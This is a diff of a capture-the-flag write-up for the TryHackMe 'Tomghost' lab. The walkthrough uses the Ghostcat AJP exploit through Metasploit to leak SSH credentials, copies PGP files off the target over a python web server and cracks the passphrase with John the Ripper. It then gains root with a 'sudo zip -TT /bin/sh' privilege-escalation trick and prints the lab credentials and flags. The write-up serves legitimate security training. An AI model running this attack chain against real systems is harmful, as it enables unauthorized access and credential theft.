@@ -1,13 +1,17 @@
+# Tomghost
+### An Apache Tomcat vulnerability
+
+Link to the tryhackme room:
 https://tryhackme.com/room/tomghost
 
-Vulnerable Machine IP: 10.81.170.211
+Vulnerable Machine IP: 10.81.170.211<br>
 Attack Machine IP: 192.168.136.34
 
-Let's begin with a simple Nmap scan to identify all open ports (quick SYN Scan, option -T4 used to increase speed)
+Let's begin with a simple Nmap scan to identify all open ports (quick SYN Scan, option -T4 used to increase speed)<br>
 `└─$ nmap -sS 10.81.170.211 -p- -T4`
 
-From the port range 0-65535 only four ports were discovered: 22, 53, 8009, 8080.
-Let's enumerate them further:
+From the port range 0-65535 only four ports were discovered: 22, 53, 8009, 8080.<br>
+Let's enumerate them further:<br>
 `└─$ nmap -sC -sV -O 10.81.170.211 -p22,53,8009,8080`
 
 ```
@@ -24,13 +28,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 Note: less interesting lines have been cut for brevity.
 
-As we can see, we're dealing with Apache Tomcat 9.0.30. Since the room is called '*Tomghost*' with can deduce, that it's based on **Tom**cat vulnerability.
-A quick search in Google yields an exploit that might interest us:
-`Search: apache tomcat 9.0.30 vulnerability`
+As we can see, we're dealing with Apache Tomcat 9.0.30. Since the room is called '*Tomghost*' with can deduce, that it's based on **Tom**cat vulnerability.<br>
+A quick search in Google yields an exploit that might interest us:<br>
+`Search: apache tomcat 9.0.30 vulnerability`<br>
 `Found: Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit)`
 >It's difficult to search for this purely through searchsploit or exploit-db, because it doesn't contain Tomcat version in the title.
 
-If we notice '(Metasploit)' in the title, we should already know `msfconsole` is the next command we will execute in our terminal. 
+If we notice '(Metasploit)' in the title, we should already know `msfconsole` is the next command we will execute in our terminal. <br>
 After Metasploit has been launched, enter:
 `msf > search ghostcat`
 Only one result is found: 
@@ -39,7 +43,7 @@ auxiliary/admin/http/tomcat_ghostcat, disclosed: 2020-02-20
 
 > use 0
 ```
-Note: we specified '*use 0*', because that's the id (#) of the found vulnerabilities from the list (left side, next to the name)
+>We specified '*use 0*', because that's the id (#) of the found vulnerabilities from the list (left side, next to the name)
 
 Let's try to run it! But first, we need to set up options:
 `show options`
@@ -59,13 +63,14 @@ RHOSTS => 10.81.170.211
 ```
 
 And now just enter command: `run` (or `exploit` if you want to feel like a hacker ;)
-The exploit should come through. It shows user credentials!
+
+The exploit should come through. It shows user credentials!<br>
 They are inserted in html code shown from the website:
 ```
 skyfuck:8730281lkjlkjdqlksalks
 ```
 
-I've tried to access Apache Tomcat on port 8080, but it didn't seem to work. 
+I've tried to access Apache Tomcat on port 8080, but it didn't seem to work.<br>
 But there was also OpenSSH available on port 22! Maybe that'll work?
 ```
 └─$ ssh skyfuck@10.81.170.211
@@ -75,14 +80,9 @@ skyfuck
 ```
 Yes! Worked perfectly.
 
-Let's look around.
-In the skyfuck's user directory there are two files that caught my attention: *credential.pgp* and *tryhackme.asc*. 
+Let's look around.<br>
+In the skyfuck's user directory there are two files that caught my attention: *credential.pgp* and *tryhackme.asc*.<br>
 At this point I tried to go for low hanging fruit and checked if /etc/shadow was accessible, or which commands can I use with sudo. 
-
-```
-cat: /etc/shadow: Permission denied
-```
->"I'm sorry Dave, I'm afraid I can't do that."
 
 ```
 skyfuck@ubuntu:~$ cat /etc/shadow
@@ -91,10 +91,12 @@ skyfuck@ubuntu:~$ sudo -l
 [sudo] password for skyfuck: 
 Sorry, user skyfuck may not run sudo on ubuntu.
 ```
+>"I'm sorry Dave, I'm afraid I can't do that."
+
 It seems we need to use .pgp and .asc files somehow.
 
-Another search shows that .pgp is a file that is encrypted with PGP standard (that means "Pretty Good Privacy").
-If we use `cat` command on `tryhackme.asc`, we can see it's a private key for the PGP file..
+Another search shows that .pgp is a file that is encrypted with PGP standard (that means "Pretty Good Privacy").<br>
+If we use `cat` command on `tryhackme.asc`, we can see it's a private key for the PGP file.
 
 We need to import the secret key (.asc), and then use it for encrypted file (.pgp):
 ```
@@ -106,9 +108,10 @@ You need a passphrase to unlock the secret key for
 user: "tryhackme <stuxnet@tryhackme.com>"
 Enter passphrase: 
 ```
-D'oh! We don't have the passphrase!
+D'oh! We don't have the passphrase!<br>
 That's where cracking passwords come to play.
-There are no password crackers on the machine we are attacking. [ :( ]
+
+There are no password crackers on the machine we are attacking :( <br>
 They need to be transferred to our attack machine. I'm going to use `python3`, because it's available on the target:
 ```
 skyfuck@ubuntu:~$ python3 --version
@@ -125,7 +128,7 @@ On attack machine:
 ... ‘credential.pgp’ saved
 ```
 
-Now we have the files on our attack machine. 
+Now we have the files on our attack machine. <br>
 Johntheripper, software known for cracking hashes has a module `gpg2john` that converts a private key in pure form into something that JTR can crack.
 
 Here's the catch: We actually need to crack .asc key, not the pgp!
@@ -143,7 +146,7 @@ After checking the format (`john --list=formats | grep gpg)` we can proceed with
 ```
 Remember to specify the format and wordlist for bruteforce. Without the `--format=gpg`, john tried to load tripcode instead of gpg in my case.
 
-It went well! The passphrase is: `alexandru`
+It went well! The passphrase is: `alexandru`<br>
 If you lost it between the lines, just use `john key.john --show`.
 
 Now we go back to the target machine. Turn off python server and try to breach once again:
@@ -156,8 +159,8 @@ skyfuck@ubuntu:~$ gpg --decrypt credential.pgp
 merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
 ```
 
-And we're in! ...well still not root, but it's something ^^
-In the home of Merlin, we can see our first flag: `THM{GhostCat_1s_so_cr4sy}
+And we're in! ...well still not root, but it's something ^^<br>
+In the home of Merlin, we can see our first flag: `THM{GhostCat_1s_so_cr4sy}`
 
 It's worth mentioning this flag is also accessible from `skyfuck` account, so we haven't gained much at this point (but it's something!).
 
@@ -170,7 +173,8 @@ and we see...
 User merlin may run the following commands on ubuntu:
     (root : root) NOPASSWD: /usr/bin/zip
 ```
-First try! (I'm not kidding ;) That means we can zip (compress) pretty much any file in the filesystem and then do whatever we want with it (for example, change read access permissions)!
+First try! (I'm not kidding ;) <br>
+That means we can zip (compress) pretty much any file in the filesystem and then do whatever we want with it (for example, change read access permissions)!
 
 So to check if we can actually use it with sudo:
 ```
@@ -181,9 +185,8 @@ Zip 3.0 (July 5th 2008). Usage:
 ```
 >Because we want to break into root account, we will forget for a while that zip could also be used to instantly retrieve root.txt flag ;)
 
-GTFOBins helps here. At first I went into the rabbit hole of password cracking using passwd and shadow, but came to conclusion that it'll take a while to crack sha512crypt password. 
-
-GTFOBins says that all we need to do is execute one command and we'll be root!
+GTFOBins helps here. At first I went into the rabbit hole of password cracking using passwd and shadow, but came to conclusion that it'll take a while to crack sha512crypt password. <br>
+They say that all we need to do is execute one command and we'll be root!
 ```
 merlin@ubuntu:~$ sudo /usr/bin/zip /tmp/tempfile /etc/hosts -T -TT '/bin/sh #'
   adding: etc/hosts (deflated 31%)
@@ -205,10 +208,10 @@ THM{Z1P_1S_FAKE}
 Finished! 
 That concludes this challenge. Thanks for reading and see you in the next one!
 
-Sources:
-https://www.exploit-db.com/exploits/49039
-https://www.goanywhere.com/blog/what-is-a-pgp-file
-https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key
-https://github.com/openwall/john/blob/bleeding-jumbo/src/gpg2john.c
-https://www.kali.org/tools/john/
-https://gtfobins.github.io/gtfobins/zip/
+Sources:<br>
+https://www.exploit-db.com/exploits/49039<br>
+https://www.goanywhere.com/blog/what-is-a-pgp-file<br>
+https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key<br>
+https://github.com/openwall/john/blob/bleeding-jumbo/src/gpg2john.c<br>
+https://www.kali.org/tools/john/<br>
+https://gtfobins.github.io/gtfobins/zip/<br>
